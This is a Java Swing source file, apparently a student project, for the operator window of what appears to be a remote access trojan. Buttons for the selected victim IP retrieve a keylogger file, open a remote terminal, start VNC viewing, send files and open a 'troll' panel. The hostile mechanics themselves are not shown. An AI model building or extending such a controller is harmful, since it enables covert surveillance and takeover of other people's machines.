package gui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Vector;

import javax.swing.DefaultListModel;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDesktopPane;
import javax.swing.JFrame;
import javax.swing.JList;
import javax.swing.JMenuBar;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JToolBar;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

import master.Connexion;
import sound.Jukebox;
import constante.Constante;

/**
 * GUI pour le Maitre, gère une liste de connexions, gère les cliques sur les
 * boutons et se charge de les envoyer au controle (connexion) Correspond au
 * modèle dans le schéma MVC
 * 
 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
 *
 */
public class FenetrePrincipal 
{

	// Parametres :  // =====================================================================

	private Vector<MJInternalFrame>				actualframes;			// InternalFrame actuellement
																						// a l'ecran
	private JDesktopPane								m_desktopPane;
	private Vector<Integer>							m_fenetres;				// Pour chaque connection quelle fenetre
																						// est actuellement affichée
	private MFrame										m_frame;					// La Jframe
	private Vector<Vector<MJInternalFrame>>	m_frames;				// InternalFrame pour
																						// toutes
																						// les connexions

	private Vector<Connexion>						m_indexToConnection; // Passer d'un index dans la
																						// liste a la connection

	private JList<String>							m_list;					// La JList des addresses Ip
	private Boolean									m_modifiable;			// Bloque la liste quand celle ci est
																						// rafraichie
	private JToolBar									toolBar;

	// Constructeur :
	// =====================================================================

	public FenetrePrincipal()
	{
		initialize();
		this.m_frame.setVisible(true);
		m_modifiable = true;
	}

	// Methodes :	
	// =====================================================================

	/**
	 * Affiche un label/ bouton dès que un nouveau fichier est recu
	 * @throws InterruptedException
	 */
	public void Addinformation(String info) throws InterruptedException
	{

		final JButton button = new JButton(info);
		button.setFont(new Font("Courrier", Font.BOLD, 11));
		button.setForeground(Color.RED);
		button.setBackground(Color.YELLOW);
		button.setVisible(true);
		button.setEnabled(false);
		toolBar.add(button);
		Thread information = new Thread()
		{ // Demarre le thread d'envoi
			@Override
			public void run()
			{
				try
				{
					Thread.sleep(5000);
					button.setVisible(false);
				}
				catch (InterruptedException e)
				{
					e.printStackTrace();
				}
			}
		};
		information.start();

	}

	/**
	 * Modifie les fenetres actuellement affichées pour que si l'on change de
	 * connexion, cela change aussi le workspace
	 */
	private synchronized void changeWorkspace()
	{

		for (MJInternalFrame frame : actualframes)
		{
			frame.setVisible(false); 										// Masque les frames de l'ancien espace de
			// travail
		}
		int index = getSelectedIndex(); 									// Recupere le nouvel index
		actualframes.clear();

		if (index != -1)
		{
			Connexion connexion = m_indexToConnection.elementAt(index);	// Chane l'icone de la fenetre
			if (connexion.get_os_name().contains("Win")
					|| connexion.get_os_name().contains("win"))
			{ // Change l'icone de l'application
				m_frame.setIconImage(Toolkit.getDefaultToolkit().getImage(
						Paths.get("").toAbsolutePath().toString() + File.separator
								+ "ressources" + File.separator + "WW.png"));
			}
			else
			{
				m_frame.setIconImage(Toolkit.getDefaultToolkit().getImage(
						Paths.get("").toAbsolutePath().toString() + File.separator
								+ "ressources" + File.separator + "logo27.png"));
			}
		}
		for (int i = 0; i < m_frames.get((index == -1) ? 0 : index).size(); i++)
		{
			if (index == -1 || m_frames.get(index).isEmpty())
				break; 															// Si pas d'indice selectionné ou pas de fenetres active
																					// pour la connexion

			m_frames.get(index).get(i).setVisible(true); 			// Affiche les
																					// nouvelles fenetres
			actualframes.add(m_frames.get(index).get(i)); 			// Les ajoute a la
																					// liste
																					// pour le nouveau
																					// espace de travail
		}
		m_list.setEnabled(true); 											// Autorise a modifier la liste
	}

	/**
	 * Est appele par les MouseClicked avec un code particulier Ouvre une
	 * nouvelle fenetre suivant le code, verifie qu'elle n'est pas déja ouverte
	 * et que l'on a bien séléctionné une connexion
	 * 
	 * @param keycode
	 *            : code indiquant quelle type de fenetre doit etre ouvert
	 */
	private void clicked(int keycode)
	{	
		int index = getSelectedIndex(); 												// Recupere la connexion actuellement en
		// traitement
		if (index != -1)
		{
			if (((m_fenetres.get(index).intValue() & (1 << keycode)) == 0)) // Si une fenetre similaire n'est pas déja ouverte
	
			{
				Connexion connexion = m_indexToConnection.get(index); 
				if (keycode == Constante.code_terminal_affichage) 				// Suivant le code qui est passé en parametre de la méthode
				{
					MTerminalJInternalFrame mcmdJF = new MTerminalJInternalFrame(
							connexion.get_user_name() + " term", actualframes.size(),
							connexion); 													// Nouvelle fenetre

					actualframes.addElement(mcmdJF); 								// Ajoute la fenetre a la
																								// liste de la page
																								// actuelle
					m_frames.get(index).add(mcmdJF); 								// Ajoute la fenetre a la
																								// liste des fenetres
																								// pour
																								// cette connections
					m_desktopPane.add(mcmdJF);
					mcmdJF.setBounds(100, 100, 200, 200);
					mcmdJF.setSize(400, 290);
					mcmdJF.setLocation(30 * actualframes.size(),
							30 * actualframes.size());

					try
					{
						mcmdJF.setSelected(true);
					}
					catch (java.beans.PropertyVetoException e)
					{
					}
					mcmdJF.setVisible(true);

				}
				else if (keycode == Constante.code_troll)
				{
					MotherJInternalFrame moJF = new MotherJInternalFrame(
							"Panneau de commande pour " + connexion.get_user_name(),
							connexion, actualframes.size());
					actualframes.add(moJF);
					m_frames.get(index).add(moJF);
					m_desktopPane.add(moJF);
					moJF.setBounds(100, 100, 200, 200);
					moJF.setSize(300, 300);
					moJF.setLocation(30 * actualframes.size(),
							30 * actualframes.size());
					try
					{
						moJF.setSelected(true);
					}
					catch (java.beans.PropertyVetoException e)
					{
					}
					moJF.setVisible(true);
				}
				else if (keycode == Constante.code_envoyer)
				{
					MFileInternalFrame mFJF = new MFileInternalFrame(
							"Envoyer Fichier" + connexion.get_user_name(), connexion,
							actualframes.size());
					actualframes.add(mFJF);
					m_frames.get(index).add(mFJF);
					m_desktopPane.add(mFJF);
					mFJF.setBounds(100, 100, 200, 200);
					mFJF.setSize(300, 300);
					mFJF.setLocation(30 * actualframes.size(),
							30 * actualframes.size());
					try
					{
						mFJF.setSelected(true);
					}
					catch (java.beans.PropertyVetoException e)
					{
					}
					mFJF.setVisible(true);
				}
				else if (keycode == Constante.code_vnc_afficage)
				{
					connexion.sendVNCcommand();
					// Affichage affichage=new Affichage();
					// affichage.setVisible(true);
				}
				else if (keycode == Constante.code_info_affichage)
				{
					MInfoJInternalFrame minfJF = new MInfoJInternalFrame(
							connexion.get_user_name() + " info", connexion,
							actualframes.size());
					actualframes.add(minfJF);
					m_frames.get(index).add(minfJF);
					m_desktopPane.add(minfJF);
					minfJF.setBounds(100, 100, 200, 200);
					minfJF.setSize(100, 150);
					minfJF.setLocation(30 * actualframes.size(),
							30 * actualframes.size());
					try
					{
						minfJF.setSelected(true);
					}
					catch (java.beans.PropertyVetoException e)
					{
					}
					minfJF.setVisible(true);
				}
				m_fenetres.set(index, m_fenetres.get(index) + (1 << keycode)); // Desormais il est plus possible
																									// de créer une fenetre pareil
			}
			else
			{
				try
				{
					Addinformation("FENETRE DEJA EXISTENTE");
				}
				catch (InterruptedException e)
				{
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
	}

	
	
	
	/**
	 * Supprime la JInternalFrame fermé par l'utilisateur
	 * @param mjiFrame
	 */
	private void deletePrivee(MJInternalFrame mjiFrame, int keycode)
	{
		if (actualframes.contains(mjiFrame)) 										// Supprime de la liste des
		// fenetres affichés a l'ecrans
		{
			actualframes.removeElement(mjiFrame);
			mjiFrame.setVisible(false); 												// Au cas ou, mais en principe inutil
			m_desktopPane.remove(mjiFrame);
		}
		int index = getSelectedIndex();
		if (index != -1)
		{
			if (!m_frames.isEmpty() && m_frames.size() >= index
					&& m_frames.get(index).contains(mjiFrame))
			{
				m_frames.get(index).removeElement(mjiFrame); 					// Supprime de la
																								// liste des
																								// fenetres de
																								// la
																								// connexion
																								// actuelle
																								// affichée
			}
			if (!m_fenetres.isEmpty() && keycode != -1)
			{
				m_fenetres.set(index, m_fenetres.get(index) - (1 << keycode)); // Enleve
				// le
				// code
				// qui
				// empechait
				// d'en
				// creer
				// une
				// nouvelle
			}

		}

	}

	/**
	 * Methode public appelé depuis le listener de fermeture des JInternalFrame
	 * Appelle la methode privee de la fenetre principale
	 * 
	 * @param mjiFrame
	 */
	public void deletePublic(MJInternalFrame mjiFrame, int keycode)
	{
		deletePrivee(mjiFrame, keycode);
	}

	/**
	 * Recupere la liste des MJInternalFrame ouverte pour la connection co
	 * 
	 * @param co
	 *            : la connection en question
	 * @return
	 */
	public Vector<MJInternalFrame> getFrameIndexConnection(Connexion co)
	{
		Vector<MJInternalFrame> x = m_frames.get(m_indexToConnection.indexOf(co));
		return x;
	}

	/**
	 * Recupere l'index de l'element choisi dans la liste des connexions choisis
	 * 
	 * @return
	 */
	private int getSelectedIndex()
	{
		return m_list.getSelectedIndex();
	}

	/**
	 * Initialise la fenetre Principale Ajoute les ActionListener
	 * 
	 */
	private synchronized void initialize()
	{
		m_frame = new MFrame();
		m_frame.setIconImage(Toolkit.getDefaultToolkit().getImage(
				Paths.get("").toAbsolutePath().toString() + File.separator
						+ "ressources" + File.separator + "mask1.png"));

		m_frame.setBounds(100, 100, 766, 513);
		m_frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		m_frame.getContentPane().setLayout(new BorderLayout(0, 0));

		actualframes = new Vector<>(); // Allocation pour les vector
		m_frames = new Vector<Vector<MJInternalFrame>>();
		m_indexToConnection = new Vector<>();
		m_fenetres = new Vector<>(0); // Initialise les valeurs à -1

		m_list = new JList<String>(); // Jlist
		m_list.setBackground(new Color(0, 153, 51));
		m_list.setForeground(new Color(0, 0, 128));

		toolBar = new JToolBar(); // Tool Bar
		toolBar.setBackground(new Color(0, 102, 153));
		m_frame.getContentPane().add(toolBar, BorderLayout.NORTH);

		final JButton btnNewButton = new JButton("Notification");
		btnNewButton.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
				.toString()
				+ File.separator + "ressources" + File.separator + "turn20.png"));
		btnNewButton.setFont(new Font("Tahoma", Font.BOLD, 11));
		btnNewButton.setForeground(Color.BLUE);
		btnNewButton.setBackground(new Color(0, 255, 51));
		
		btnNewButton.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent arg0)
			{
				int index = getSelectedIndex();
				if (index != -1)
				{
					Connexion connexion = m_indexToConnection.get(index); // Recupere
					// la
					// connexion
					connexion.sendNotification(Constante.message_url,
							Constante.url_update); // Envoit une demande de
					// notification
				}
			}
		});

		toolBar.add(btnNewButton);

		JButton btnNewButton_1 = new JButton("Keylogger"); // Recuperer le
		// fichier de keylog
		btnNewButton_1.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
				.toString()
				+ File.separator
				+ "ressources"
				+ File.separator
				+ "computer207.png"));
		btnNewButton_1.setFont(new Font("Tahoma", Font.ITALIC, 11));
		btnNewButton_1.setForeground(Color.BLUE);
		btnNewButton_1.setBackground(new Color(0, 255, 51));
		btnNewButton_1.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent e)
			{
				int index = getSelectedIndex();
				if (index != -1)
				{
					Connexion connexion = m_indexToConnection.get(index);
					connexion.sendKeylog();
				}
			}
		});
		toolBar.add(btnNewButton_1);

		JButton btnNewButton_2 = new JButton("Terminal");
		btnNewButton_2.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
				.toString()
				+ File.separator
				+ "ressources"
				+ File.separator
				+ "logotype192.png"));
		btnNewButton_2.setFont(new Font("Tahoma", Font.BOLD, 11));
		btnNewButton_2.setBackground(new Color(0, 255, 51));
		btnNewButton_2.setForeground(Color.BLUE);
		btnNewButton_2.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent e)
			{
				clicked(Constante.code_terminal_affichage); // 1 correspond au
				// code pour lancer
				// une JInFrame de
				// CMD
			}
		});
	
		toolBar.add(btnNewButton_2);

		m_desktopPane = new JDesktopPane(); // Espace de travail
		m_desktopPane.setBackground(new Color(0, 0, 128));

		m_frame.getContentPane().add(m_desktopPane, BorderLayout.CENTER);
		
																									// Bouton VNC
		JButton btnNewButton_3 = new JButton("VNC");
		btnNewButton_3.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
				.toString()
				+ File.separator + "ressources" + File.separator + "screen54.png"));
		btnNewButton_3.setFont(new Font("Tahoma", Font.ITALIC, 11));
		btnNewButton_3.setForeground(Color.BLUE);
		btnNewButton_3.setBackground(new Color(0, 255, 51));
		btnNewButton_3.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent e)
			{
				clicked(Constante.code_vnc_afficage);
			}
		});
		toolBar.add(btnNewButton_3);

		
																											// Bouton Information
		final JButton btnNewButton_4 = new JButton("Informations");
		btnNewButton_4.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
				.toString()
				+ File.separator
				+ "ressources"
				+ File.separator
				+ "business133.png"));
		btnNewButton_4.setFont(new Font("Tahoma", Font.BOLD, 11));
		btnNewButton_4.setForeground(Color.BLUE);
		btnNewButton_4.setBackground(new Color(0, 255, 51));
		btnNewButton_4.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent e)
			{
				clicked(Constante.code_info_affichage);
			}
		});
		toolBar.add(btnNewButton_4);

		JButton btnNewButton_5 = new JButton("\r\n");
		btnNewButton_5.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
				.toString()
				+ File.separator
				+ "ressources"
				+ File.separator
				+ "emoticon120.png"));
		btnNewButton_5.setBackground(Color.GREEN);
		toolBar.add(btnNewButton_5);
		btnNewButton_5.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent e)
			{
				clicked(Constante.code_troll); // 1 correspond au code pour
				// lancer une JInFrame de CMD
			}
		});

		JButton btnNewButton_6 = new JButton("Envoyer");
		btnNewButton_6.setIcon(new ImageIcon(Paths.get("").toAbsolutePath()
				.toString()
				+ File.separator + "ressources" + File.separator + "tray33.png"));
		btnNewButton_6.setBackground(Color.GREEN);
		toolBar.add(btnNewButton_6);
		btnNewButton_6.addMouseListener(new MouseAdapter()
		{
			@Override
			public void mouseClicked(MouseEvent e)
			{
				clicked(Constante.code_envoyer); // 1 correspond au code pour
				// lancer une JInFrame de
				// CMD
			}
		});

		JPanel panel = new JPanel();
		m_frame.getContentPane().add(panel, BorderLayout.EAST);

		JPanel panel_1 = new JPanel();
		panel_1.setBackground(new Color(0, 102, 102));
		m_frame.getContentPane().add(panel_1, BorderLayout.WEST);

		JScrollPane scrollPane = new JScrollPane(m_list);
		panel_1.add(scrollPane);

		ListSelectionListener listSelectionListener = new ListSelectionListener()
		{ // Listener
			// des
			// que
			// l'on
			// change
			// de
			// connexions
			public void valueChanged(ListSelectionEvent listSelectionEvent)
			{
				m_list.setEnabled(false);
				Thread attendre = new Thread()
				{
					public void run()
					{
						while (!m_modifiable)
						{
							try
							{
								Thread.sleep(100);
								this.join();
							}
							catch (InterruptedException e)
							{
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
						if (m_modifiable)
							changeWorkspace();
					}
				};
				attendre.start();
			}
		};
		m_list.addListSelectionListener(listSelectionListener);

		JMenuBar menuBar = new JMenuBar();
		m_frame.setJMenuBar(menuBar);

		
		
		
		for (int i = 0; i < 20; i++)
			m_frames.add(new Vector<MJInternalFrame>());
		launchPlaylist();
	}

	/**
	 * Modifie la liste actuelle des connexions possibles
	 * @param connexions
	 *            : la liste des connexions a mettre dans la Jlist
	 */
	public synchronized void setJlist(Vector<Connexion> connexions)
	{
		m_modifiable = false;
		int size = m_indexToConnection.size();
		m_indexToConnection.clear();
		DefaultListModel<String> lists = new DefaultListModel<>();
		int i = 0;
		m_list.setSelectedIndex(-1);
		for (Connexion connexion : connexions)
		{
			m_indexToConnection.add(i, connexion);
			m_fenetres.insertElementAt(i, 0);
			lists.add(i++, connexion.get_ip().split("/")[1]);

		}
		m_list.setSelectedIndex(0);
		m_modifiable = true;
		m_list.setModel(lists);
	}

	/**
	 * Instancie une nouvelle playlist de musique, appelée depuis le
	 * constructeur
	 */
	public void launchPlaylist()
	{
		ArrayList<String> liste = new ArrayList<String>(); // Listes des
		// musiques
		liste.add(Constante.nom1);liste.add(Constante.nom8);liste.add(Constante.nom3);liste.add(Constante.nom4);liste.add(Constante.nom5);
		liste.add(Constante.nom6);liste.add(Constante.nom7);
		Jukebox.addPlaylist("BestPlaylist", liste);
	}

}
